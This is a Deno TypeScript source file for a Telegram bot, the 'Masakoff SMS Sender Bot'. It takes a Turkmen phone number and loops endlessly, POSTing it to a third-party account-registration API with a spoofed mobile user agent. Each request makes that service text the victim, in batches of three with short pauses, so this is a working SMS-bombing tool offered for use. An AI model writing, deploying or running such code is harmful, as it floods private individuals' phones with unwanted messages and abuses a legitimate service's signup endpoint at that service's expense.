// main.ts
// Masakoff SMS Sender Bot (Deno)
// Sends POST requests in batches of 3 with delays via Telegram webhook

import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";

// --- Telegram settings ---
const TOKEN = Deno.env.get("BOT_TOKEN");
if (!TOKEN) throw new Error("BOT_TOKEN env var is required");
const API = `https://api.telegram.org/bot${TOKEN}`;
const SECRET_PATH = "/masakoffvpnhelper";

// --- Helper to send Telegram messages ---
async function sendMessage(chatId: string, text: string, options: any = {}) {
  try {
    const body = { chat_id: chatId, text, ...options };
    await fetch(`${API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
  } catch (e) {
    console.error("sendMessage error", e);
  }
}

// --- Send POST request function ---
async function sendPostRequest(url: string, headers: Record<string, string>, data: Record<string, any>) {
  try {
    const resp = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(data),
    });
    return resp.status === 200;
  } catch {
    return false;
  }
}

// --- SMS sending logic ---
async function sendSMS(phoneNumber: string, chatId: string) {
  const requestsData = [
    {
      url: "https://api.saray.tm/api/v1/accounts",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.saray.tm",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.12.0"
      },
      data: { phone: `+993${phoneNumber}` }
    }
  ];

  let count = 0;

  while (true) {
    for (let batch = 0; batch < 3; batch++) {
      count++;
      for (const req of requestsData) {
        await sendMessage(chatId, `📤 ${count}-nji SMS ugradylyar...`);
        const success = await sendPostRequest(req.url, req.headers, req.data);
        await sendMessage(chatId, success ? "✅ BARDY ✅" : "⛔ BARMADY ⛔");
        await delay(5000); // 5s between each SMS
      }
    }
    await sendMessage(chatId, "⏳ 3 SMS tamamlandy, 45 sekunt garaşylýar...");
    await delay(45000); // 45s pause before next batch
  }
}

// --- Webhook server ---
serve(async (req) => {
  if (req.method !== "POST" || new URL(req.url).pathname !== SECRET_PATH) {
    return new Response("Invalid", { status: 400 });
  }

  const update = await req.json();

  // Only handle private messages
  if (!update.message || update.message.chat.type !== "private") {
    return new Response("OK");
  }

  const chatId = update.message.chat.id;
  const text = (update.message.text ?? "").trim();

  if (text.startsWith("/start")) {
    await sendMessage(chatId, "Welcome to Masakoff SMS Sender Bot! 🚀\nSend /send +993xxxxxxx to start sending SMS.");
  } else if (text.startsWith("/send")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "Please provide a phone number. Example:\n/send 12345678");
    } else {
      const phoneNumber = parts[1].replace(/^\+993/, "");
      await sendMessage(chatId, `Starting SMS sending to +993${phoneNumber}...`);
      // Run SMS sending in background
      sendSMS(phoneNumber, chatId).catch(console.error);
    }
  } else {
    await sendMessage(chatId, "Unknown command. Use /start or /send <number>.");
  }

  return new Response("OK");
});
